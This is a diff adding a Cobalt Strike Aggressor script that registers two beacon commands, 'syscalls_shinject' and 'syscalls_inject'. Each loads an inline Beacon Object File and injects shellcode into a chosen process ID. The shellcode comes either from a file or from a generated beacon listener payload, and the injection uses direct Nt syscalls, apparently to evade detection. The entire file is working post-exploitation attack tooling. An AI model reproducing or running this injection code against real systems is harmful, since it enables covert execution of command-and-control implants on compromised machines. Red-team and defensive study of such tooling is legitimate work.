@@ -1,0 +1,63 @@
+beacon_command_register(
+"syscalls_shinject", 
+"Use syscalls from on-disk dll to execute custom shellcode launch with Nt functions.", 
+"Synopsis: syscalls_shinject PID path_to_bin");
+
+beacon_command_register(
+"syscalls_inject", 
+"Use syscalls from on-disk dll to execute CRT beacon shellcode launch with Nt functions.", 
+"Synopsis: syscalls_inject PID listener_name");
+
+alias syscalls_shinject {
+	local('$handle $data $args $sc_data');
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("syscallsinject. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	$sc_handle = openf($3);
+	$sc_data = readb($sc_handle, -1);
+	closef($sc_handle);
+
+	# pack our arguments
+	$args = bof_pack($1, "ib", $2, $sc_data);
+	
+	btask($1, "Syscalls Shellcode Injection BOF (@ajpc500)");
+	btask($1, "Reading shellcode from: $+  $3");
+
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias syscalls_inject {
+	local('$handle $data $args');
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+
+	# read in the right BOF file
+	$handle = openf(script_resource("syscallsinject. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	if (listener_info($3) is $null) {
+		berror($1, "Could not find listener $3");
+	}
+	else {
+		$sc_data = artifact_payload($3, "raw", "x64");
+
+		# pack our arguments
+		$args = bof_pack($1, "ib", $2, $sc_data);
+
+		btask($1, "Syscalls Shellcode Injection BOF (@ajpc500)");
+		btask($1, "Using $+  $3  $+ listener for beacon shellcode generation.");
+
+		# execute it.
+		beacon_inline_execute($1, $data, "go", $args);
+	}
+}
